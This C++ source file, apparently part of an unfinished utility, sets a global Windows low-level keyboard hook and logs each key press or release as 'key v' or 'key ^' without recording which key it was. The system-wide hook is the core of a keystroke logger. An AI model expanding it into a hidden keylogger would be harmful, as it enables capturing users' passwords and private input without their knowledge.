#include "HookKeyLogger.h"

static std::ostream *out;
std::set<char> modifiersPressed;

static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION)
	{
		const auto* ptr = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
		std::string output;
		if(wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
		{
			output = "key v";
		} else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
		{
			output = "key ^";
		}
		*out << output << std::endl;
	}
	return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

namespace hookKeyLogger
{
	void log(std::ostream& out)
	{
		::out = &out;
		const HHOOK handle = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, nullptr, 0);
		if (handle != nullptr)
		{
			BOOL result;
			MSG message;
			while ((result = GetMessage(&message, nullptr, 0, 0)))
			{
				if (result == -1)
				{
					out << "\nError occured in message pump" << std::endl;
				}
				else
				{
					TranslateMessage(&message);
					DispatchMessage(&message);
				}
			}
		}
	}
}